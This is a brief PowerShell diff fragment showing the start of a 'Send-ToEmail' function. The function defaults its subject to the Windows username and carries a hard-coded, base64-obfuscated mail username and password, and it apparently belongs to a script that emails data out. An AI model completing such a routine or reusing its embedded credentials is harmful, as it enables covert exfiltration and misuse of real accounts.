@@ -1,3 +1,4 @@
+
 function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
     $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
     $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
